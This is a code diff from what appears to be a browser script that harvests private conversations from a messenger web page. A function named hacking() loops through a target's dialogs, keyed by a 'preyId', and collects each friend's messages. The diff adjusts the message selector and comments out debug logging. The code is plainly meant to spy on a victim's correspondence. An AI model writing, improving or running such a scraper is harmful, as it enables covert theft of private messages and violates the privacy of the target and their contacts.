@@ -98,7 +98,9 @@ function getMessages() {
     document.querySelectorAll('.im-mess-stack').forEach(mess =>
         messages.push({
             name: mess.querySelector('.im-mess-stack--lnk').innerHTML,
-            mess: mess.querySelector('.im-mess--text').outerHTML,
+            // mess: mess.querySelector('.im-mess--text').outerHTML,
+            mess: mess.querySelector('.im-mess-stack--mess').outerHTML,
+
         })
     );
     return messages;
@@ -400,8 +402,6 @@ async function hacking() {
         // добавляем сообщения с этой страницы в объект по имени
         dialogsData[preyId][friendName] = getMessages();
 
-        // console.log(dialogsData);
-
         i++; // увеличиваем i, чтобы перейти к след. диалогу
     }, 2000);
 
@@ -418,7 +418,9 @@ async function hacking() {
             }
         );
 
-        console.log('data is missed');
+        //  console.log(dialogsData);
+
+        //  console.log('data is missed');
 
         dialogsData = {
             [preyId]: {}
